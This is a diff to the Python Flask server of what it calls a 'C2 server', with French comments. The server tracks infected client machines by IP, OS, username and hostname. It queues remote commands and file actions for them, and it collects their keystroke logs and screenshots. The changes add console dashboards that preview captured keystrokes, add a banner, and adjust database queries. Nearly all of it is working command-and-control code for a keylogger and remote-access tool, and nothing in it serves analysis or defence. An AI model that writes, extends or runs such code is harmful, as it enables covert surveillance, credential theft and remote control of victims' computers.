@@ -1,5 +1,4 @@
 from flask import Flask, request, jsonify, send_from_directory
-from flask_cors import CORS  # AJOUT IMPORTANT
 import time
 import threading
 from datetime import datetime
@@ -9,8 +8,8 @@ from config import ENCRYPTION_KEY
 from encryptor import Encryptor
 from protocol import Protocol
 
+
 app = Flask(__name__)
-CORS(app)  # PERMET LES REQUÊTES DEPUIS LE NAVIGATEUR
 
 #In-memory storage for clients
 clients = {}
@@ -389,6 +388,75 @@ def save_keylogs_to_file():
 # Charger les keylogs au démarrage
 load_keylogs_from_file()
 
+
+
+
+def print_clients_table():
+    """Affiche un tableau formaté des clients connectés"""
+    if not clients:
+        return
+    
+    print("\n" + "="*120)
+    print(f"{'CLIENT ID':<30} {'IP':<20} {'OS':<20} {'ONLINE':<10} {'LAST SEEN':<20}")
+    print("="*120)
+    
+    current_time = time.time()
+    for client_id, client_data in clients.items():
+        last_seen = client_data.get('last_seen', 0)
+        is_online = current_time - last_seen < 10
+        
+        system_info = client_data.get('system_info', {})
+        os_name = system_info.get('platform', 'Unknown')[:18]
+        ip_addr = client_data.get('ip', 'N/A')[:18]
+        
+        time_diff = int(current_time - last_seen)
+        if time_diff < 60:
+            last_seen_str = f"{time_diff}s ago"
+        elif time_diff < 3600:
+            last_seen_str = f"{time_diff // 60}m ago"
+        else:
+            last_seen_str = f"{time_diff // 3600}h ago"
+        
+        status = "🟢 ONLINE" if is_online else "🔴 OFFLINE"
+        
+        print(f"{client_id:<30} {ip_addr:<20} {os_name:<20} {status:<10} {last_seen_str:<20}")
+    
+    print("="*120 + "\n")
+
+
+def print_server_stats():
+    """Affiche les statistiques du serveur"""
+    current_time = time.time()
+    online_count = sum(1 for c in clients.values() if current_time - c.get('last_seen', 0) < 10)
+    
+    total_keylogs = sum(len(logs) for logs in keylogs_storage.values())
+    clients_with_logs = len(keylogs_storage)
+    
+    print("\n" + "🎯 "*30)
+    print(f"📊 SERVER STATISTICS - {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
+    print("🎯 "*30)
+    print(f"  👥 Total Clients: {len(clients)}")
+    print(f"  🟢 Online: {online_count}")
+    print(f"  🔴 Offline: {len(clients) - online_count}")
+    print(f"  ⌨️  Total Keylogs: {total_keylogs} (from {clients_with_logs} clients)")
+    print(f"  📝 Pending Commands: {sum(len(cmds) for cmds in pending_commands.values())}")
+    print(f"  ⏱️  Server Uptime: {int(current_time - app.start_time)}s")
+    print("🎯 "*30 + "\n")
+
+
+def display_server_info():
+    """Thread pour afficher périodiquement les infos du serveur"""
+    while True:
+        try:
+            if clients:
+                print_server_stats()
+                print_clients_table()
+            time.sleep(30)  # Afficher toutes les 30 secondes
+        except Exception as e:
+            print(f"[DISPLAY] Error: {e}")
+            time.sleep(30)
+
+
 def cleanup_old_clients():
     while True:
         current_time = time.time()
@@ -400,7 +468,7 @@ def cleanup_old_clients():
         
         for client_id in clients_to_remove:
             del clients[client_id]
-            print(f"Removed inactive client: {client_id}")
+            print(f"\n❌ [CLEANUP] Removed inactive client: {client_id}\n")
         
         time.sleep(30)  #Check every 30 seconds
 
@@ -488,9 +556,17 @@ def register_client():
             'checkin_count': clients.get(client_id, {}).get('checkin_count', 0) + 1
         }
         
-        print(f"\n🟢 [REGISTER] Client {client_id} registered from {client_ip}")
-        print(f"[REGISTER] Total clients now: {len(clients)}")
-        print(f"[REGISTER] All clients: {list(clients.keys())}\n")
+        print("\n" + "="*80)
+        print(f"🟢 NEW CLIENT REGISTERED")
+        print("="*80)
+        print(f"  🆔 Client ID: {client_id}")
+        print(f"  🌐 IP Address: {client_ip}")
+        print(f"  💻 OS: {system_info.get('platform', 'Unknown')}")
+        print(f"  👤 User: {system_info.get('username', 'Unknown')}")
+        print(f"  🖥️  Hostname: {system_info.get('hostname', 'Unknown')}")
+        print(f"  🏗️  Architecture: {system_info.get('architecture', 'Unknown')}")
+        print(f"  📊 Total Clients: {len(clients)}")
+        print("="*80 + "\n")
 
         # Save client to database
         save_client_to_database(client_id, clients[client_id])
@@ -590,14 +666,9 @@ def get_clients():
         is_online = current_time - last_seen < 10
         print(f"[DEBUG] Client {client_id}: last_seen={last_seen}, online={is_online}")
         
-        system_info = client_data.get('system_info', {})
-        
         clients_list.append({
             "client_id": client_id,
-            "system_info": system_info,
-            "os": system_info.get('platform', 'Unknown'),  # AJOUTÉ pour dashboard
-            "hostname": system_info.get('hostname', 'Unknown'),  # AJOUTÉ pour dashboard
-            "username": system_info.get('username', 'Unknown'),  # AJOUTÉ pour dashboard
+            "system_info": client_data.get('system_info', {}),
             "first_seen": client_data.get('first_seen'),
             "last_seen": last_seen,
             "ip": client_data.get('ip'),
@@ -608,15 +679,12 @@ def get_clients():
     
     print(f"[ADMIN] Returning {len(clients_list)} clients")
     print(f"[DEBUG] Response: {clients_list}\n")
-    
-    response = jsonify({
+    return jsonify({
         "status": "success",
         "clients": clients_list,
         "total_clients": len(clients_list),
         "server_time": datetime.now().isoformat()
     })
-    
-    return response
 
 
 @app.route('/admin/status', methods=['GET'])
@@ -655,7 +723,7 @@ def send_process_command(client_id):
         pending_commands.setdefault(client_id, []).append(command_info)
         
         # Save command to database
-        save_command_to_database(command_id, client_id, action, data)
+        save_command_to_database(client_id, command_info)
         
         #Clean old commands per client
         if client_id in pending_commands:
@@ -765,7 +833,7 @@ def submit_command_result():
             }
             
             # Save command result to database
-            save_command_result_to_database(command_id, client_data.get('client_id'), result)
+            save_command_result_to_database(command_id, command_results[command_id])
             
             print(f"[SERVER] Successfully stored result for command {command_id}")
             
@@ -808,7 +876,7 @@ def send_file_command(client_id):
         pending_commands.setdefault(client_id, []).append(command_info)
         
         # Save command to database
-        save_command_to_database(command_id, client_id, action, data)
+        save_command_to_database(client_id, command_info)
         
         if client_id in pending_commands:
             pending_commands[client_id] = pending_commands[client_id][-10:]
@@ -876,8 +944,12 @@ def receive_keylog_data():
                 clients[client_id]['last_seen'] = time.time()
                 clients[client_id]['checkin_count'] = clients[client_id].get('checkin_count', 0) + 1
             
-            print(f"[KEYLOG] ✅ Successfully stored {len(logs)} keylogs for client {client_id}")
-            print(f"[KEYLOG] Total logs for {client_id}: {len(keylogs_storage[client_id])}")
+            print(f"\n⌨️  [KEYLOG] Received {len(logs)} new keylogs from {client_id}")
+            print(f"   📝 Total logs for this client: {len(keylogs_storage[client_id])}")
+            if logs:
+                latest_log = logs[-1]
+                preview = latest_log.get('text', '')[:50]
+                print(f"   👁️  Preview: {preview}...\n")
             
             return jsonify({
                 "success": True, 
@@ -1005,6 +1077,11 @@ cleanup_thread.start()
 keylog_cleanup_thread = threading.Thread(target=cleanup_old_keylogs, daemon=True)
 keylog_cleanup_thread.start()
 
+# AJOUT: Thread d'affichage des informations du serveur
+display_thread = threading.Thread(target=display_server_info, daemon=True)
+display_thread.start()
+print("\n✅ [INFO] Display thread started - Server stats will be shown every 30 seconds\n")
+
 # ============================================
 # API ENDPOINTS FOR DATABASE QUERIES
 # ============================================
@@ -1014,13 +1091,13 @@ def api_get_database_clients():
     """Récupère tous les clients depuis la base de données"""
     try:
         if not USE_DATABASE:
-            return jsonify({"success": False, "error": "Database not configured"}), 200
+            return jsonify({"error": "Database not configured"}), 400
         
         with get_db_connection() as conn:
             cur = conn.cursor()
             cur.execute("""
                 SELECT client_id, ip_address, system_info, 
-                       first_seen, last_seen, checkin_count, online
+                       first_seen, last_seen, checkin_count, is_online
                 FROM clients
                 ORDER BY last_seen DESC
                 LIMIT 100
@@ -1029,17 +1106,10 @@ def api_get_database_clients():
             
             clients_list = []
             for row in rows:
-                system_info = row[2] if row[2] else {}
-                if isinstance(system_info, str):
-                    try:
-                        system_info = json.loads(system_info)
-                    except:
-                        system_info = {}
-                
                 clients_list.append({
                     'client_id': row[0],
                     'ip_address': row[1],
-                    'system_info': system_info,
+                    'system_info': row[2],
                     'first_seen': row[3],
                     'last_seen': row[4],
                     'checkin_count': row[5],
@@ -1054,7 +1124,7 @@ def api_get_database_clients():
     
     except Exception as e:
         print(f"[API] Error fetching clients: {e}")
-        return jsonify({'success': False, 'error': str(e)}), 200
+        return jsonify({'error': str(e)}), 500
 
 
 @app.route('/api/database/keylogs', methods=['GET'])
@@ -1062,7 +1132,7 @@ def api_get_database_keylogs():
     """Récupère les keylogs depuis la base de données"""
     try:
         if not USE_DATABASE:
-            return jsonify({"success": False, "error": "Database not configured"}), 200
+            return jsonify({"error": "Database not configured"}), 400
         
         client_id = request.args.get('client_id')
         limit = int(request.args.get('limit', 100))
@@ -1072,7 +1142,7 @@ def api_get_database_keylogs():
             
             if client_id:
                 cur.execute("""
-                    SELECT id, client_id, timestamp, text, created_at
+                    SELECT id, client_id, window_title, keylog_data, created_at
                     FROM keylogs
                     WHERE client_id = %s
                     ORDER BY created_at DESC
@@ -1080,7 +1150,7 @@ def api_get_database_keylogs():
                 """, (client_id, limit))
             else:
                 cur.execute("""
-                    SELECT id, client_id, timestamp, text, created_at
+                    SELECT id, client_id, window_title, keylog_data, created_at
                     FROM keylogs
                     ORDER BY created_at DESC
                     LIMIT %s
@@ -1093,8 +1163,8 @@ def api_get_database_keylogs():
                 keylogs_list.append({
                     'id': row[0],
                     'client_id': row[1],
-                    'timestamp': row[2],
-                    'text': row[3],
+                    'window_title': row[2],
+                    'keylog_data': row[3],
                     'created_at': row[4]
                 })
             
@@ -1106,7 +1176,7 @@ def api_get_database_keylogs():
     
     except Exception as e:
         print(f"[API] Error fetching keylogs: {e}")
-        return jsonify({'success': False, 'error': str(e)}), 200
+        return jsonify({'error': str(e)}), 500
 
 
 @app.route('/api/database/commands', methods=['GET'])
@@ -1114,7 +1184,7 @@ def api_get_database_commands():
     """Récupère les commandes depuis la base de données"""
     try:
         if not USE_DATABASE:
-            return jsonify({"success": False, "error": "Database not configured"}), 200
+            return jsonify({"error": "Database not configured"}), 400
         
         client_id = request.args.get('client_id')
         limit = int(request.args.get('limit', 100))
@@ -1124,7 +1194,7 @@ def api_get_database_commands():
             
             if client_id:
                 cur.execute("""
-                    SELECT command_id, client_id, action, data, 
+                    SELECT command_id, client_id, action, command_data, 
                            created_at, status
                     FROM commands
                     WHERE client_id = %s
@@ -1133,7 +1203,7 @@ def api_get_database_commands():
                 """, (client_id, limit))
             else:
                 cur.execute("""
-                    SELECT command_id, client_id, action, data, 
+                    SELECT command_id, client_id, action, command_data, 
                            created_at, status
                     FROM commands
                     ORDER BY created_at DESC
@@ -1144,18 +1214,11 @@ def api_get_database_commands():
             
             commands_list = []
             for row in rows:
-                data = row[3] if row[3] else {}
-                if isinstance(data, str):
-                    try:
-                        data = json.loads(data)
-                    except:
-                        data = {}
-                
                 commands_list.append({
                     'command_id': row[0],
                     'client_id': row[1],
                     'action': row[2],
-                    'command_data': data,
+                    'command_data': row[3],
                     'created_at': row[4],
                     'status': row[5]
                 })
@@ -1168,7 +1231,7 @@ def api_get_database_commands():
     
     except Exception as e:
         print(f"[API] Error fetching commands: {e}")
-        return jsonify({'success': False, 'error': str(e)}), 200
+        return jsonify({'error': str(e)}), 500
 
 
 @app.route('/api/database/command_results', methods=['GET'])
@@ -1176,7 +1239,7 @@ def api_get_database_command_results():
     """Récupère les résultats de commandes depuis la base de données"""
     try:
         if not USE_DATABASE:
-            return jsonify({"success": False, "error": "Database not configured"}), 200
+            return jsonify({"error": "Database not configured"}), 400
         
         command_id = request.args.get('command_id')
         limit = int(request.args.get('limit', 100))
@@ -1186,7 +1249,7 @@ def api_get_database_command_results():
             
             if command_id:
                 cur.execute("""
-                    SELECT cr.id, cr.command_id, cr.result, cr.created_at,
+                    SELECT cr.id, cr.command_id, cr.result_data, cr.created_at,
                            c.client_id, c.action
                     FROM command_results cr
                     JOIN commands c ON cr.command_id = c.command_id
@@ -1195,7 +1258,7 @@ def api_get_database_command_results():
                 """, (command_id,))
             else:
                 cur.execute("""
-                    SELECT cr.id, cr.command_id, cr.result, cr.created_at,
+                    SELECT cr.id, cr.command_id, cr.result_data, cr.created_at,
                            c.client_id, c.action
                     FROM command_results cr
                     JOIN commands c ON cr.command_id = c.command_id
@@ -1207,17 +1270,10 @@ def api_get_database_command_results():
             
             results_list = []
             for row in rows:
-                result = row[2] if row[2] else {}
-                if isinstance(result, str):
-                    try:
-                        result = json.loads(result)
-                    except:
-                        result = {}
-                
                 results_list.append({
                     'id': row[0],
                     'command_id': row[1],
-                    'result_data': result,
+                    'result_data': row[2],
                     'created_at': row[3],
                     'client_id': row[4],
                     'action': row[5]
@@ -1231,7 +1287,7 @@ def api_get_database_command_results():
     
     except Exception as e:
         print(f"[API] Error fetching command results: {e}")
-        return jsonify({'success': False, 'error': str(e)}), 200
+        return jsonify({'error': str(e)}), 500
 
 
 @app.route('/api/database/screenshots', methods=['GET'])
@@ -1239,7 +1295,7 @@ def api_get_database_screenshots():
     """Récupère les métadonnées de screenshots depuis la base de données"""
     try:
         if not USE_DATABASE:
-            return jsonify({"success": False, "error": "Database not configured"}), 200
+            return jsonify({"error": "Database not configured"}), 400
         
         client_id = request.args.get('client_id')
         limit = int(request.args.get('limit', 50))
@@ -1249,7 +1305,7 @@ def api_get_database_screenshots():
             cur = conn.cursor()
             
             if include_data:
-                select_fields = "id, client_id, filename, width, height, quality, size_kb, data, created_at"
+                select_fields = "id, client_id, filename, width, height, quality, size_kb, screenshot_data, created_at"
             else:
                 select_fields = "id, client_id, filename, width, height, quality, size_kb, created_at"
             
@@ -1272,7 +1328,7 @@ def api_get_database_screenshots():
             rows = cur.fetchall()
             
             screenshots_list = []
-            for i, row in enumerate(rows):
+            for row in rows:
                 screenshot = {
                     'id': row[0],
                     'client_id': row[1],
@@ -1280,14 +1336,11 @@ def api_get_database_screenshots():
                     'width': row[3],
                     'height': row[4],
                     'quality': row[5],
-                    'size_kb': row[6]
+                    'size_kb': row[6],
+                    'created_at': row[7 if include_data else 7]
                 }
-                
                 if include_data:
-                    screenshot['data'] = row[7]
-                    screenshot['created_at'] = row[8]
-                else:
-                    screenshot['created_at'] = row[7]
+                    screenshot['screenshot_data'] = row[7]
                 
                 screenshots_list.append(screenshot)
             
@@ -1299,7 +1352,7 @@ def api_get_database_screenshots():
     
     except Exception as e:
         print(f"[API] Error fetching screenshots: {e}")
-        return jsonify({'success': False, 'error': str(e)}), 200
+        return jsonify({'error': str(e)}), 500
 
 
 @app.route('/api/database/stats', methods=['GET'])
@@ -1307,16 +1360,7 @@ def api_get_database_stats():
     """Récupère les statistiques globales de la base de données"""
     try:
         if not USE_DATABASE:
-            return jsonify({
-                "success": True,
-                "stats": {
-                    'clients': {'total': 0, 'online': 0, 'offline': 0},
-                    'keylogs': {'total': 0},
-                    'commands': {'total': 0, 'pending': 0, 'completed': 0},
-                    'results': {'total': 0},
-                    'screenshots': {'total': 0}
-                }
-            })
+            return jsonify({"error": "Database not configured"}), 400
         
         with get_db_connection() as conn:
             cur = conn.cursor()
@@ -1326,7 +1370,7 @@ def api_get_database_stats():
             total_clients = cur.fetchone()[0]
             
             # Online clients
-            cur.execute("SELECT COUNT(*) FROM clients WHERE online = true")
+            cur.execute("SELECT COUNT(*) FROM clients WHERE is_online = true")
             online_clients = cur.fetchone()[0]
             
             # Total keylogs
@@ -1376,33 +1420,8 @@ def api_get_database_stats():
     
     except Exception as e:
         print(f"[API] Error fetching stats: {e}")
-        return jsonify({'success': False, 'error': str(e)}), 200
+        return jsonify({'error': str(e)}), 500
 
-
-# Debug endpoints
-@app.route('/debug/clients', methods=['GET'])
-def debug_clients():
-    """Endpoint de debug pour voir les clients en temps réel"""
-    return jsonify({
-        "timestamp": datetime.now().isoformat(),
-        "clients_dict": clients,
-        "clients_count": len(clients),
-        "clients_ids": list(clients.keys()),
-        "pending_commands": pending_commands,
-        "keylogs_storage_keys": list(keylogs_storage.keys())
-    })
-
-@app.route('/debug/server', methods=['GET'])
-def debug_server():
-    """Informations de debug du serveur"""
-    return jsonify({
-        "server_time": datetime.now().isoformat(),
-        "uptime_seconds": time.time() - app.start_time,
-        "total_clients": len(clients),
-        "online_clients": sum(1 for c in clients.values() if time.time() - c.get('last_seen', 0) < 10),
-        "USE_DATABASE": USE_DATABASE,
-        "flask_env": app.env
-    })
 
 @app.before_request
 def before_request():
@@ -1422,5 +1441,21 @@ app.start_time = time.time()
 
 if __name__ == '__main__':
     port = int(os.environ.get('PORT', 5000))
-    print(f"[SERVER] Starting C2 server on port {port}")
+    
+    print("\n" + "🚀 "*35)
+    print("     _____ ___    ____  ___   ______   __________  ____   ________")
+    print("    / ___//__ \  / ___\/ _ | /_  __/  / ___/ __ \/ __ \\ / ___/ _ \\")
+    print("   / /__  / _/ / /__  / __ |  / /    / /__/ /_/ / / / // /  /  __/")
+    print("   \___/ /____/\___/_/ |_|_ /_/     \___/\____/_/_/_//_/   \___/ ")
+    print("                                                                  ")
+    print("🚀 "*35)
+    print(f"\n  🌐 Server Address: http://0.0.0.0:{port}")
+    print(f"  🖥️  Local Access: http://127.0.0.1:{port}")
+    print(f"  📊 Dashboard: http://127.0.0.1:{port}/dashboard")
+    print(f"  🗄️  Database: http://127.0.0.1:{port}/database")
+    print(f"  💾 Database Mode: {'PostgreSQL ✅' if USE_DATABASE else 'File Storage 📁'}")
+    print(f"  🕐 Started: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
+    print("\n" + "🚀 "*35 + "\n")
+    print("⏳ Waiting for client connections...\n")
+    
     app.run(host='0.0.0.0', port=port, debug=False)
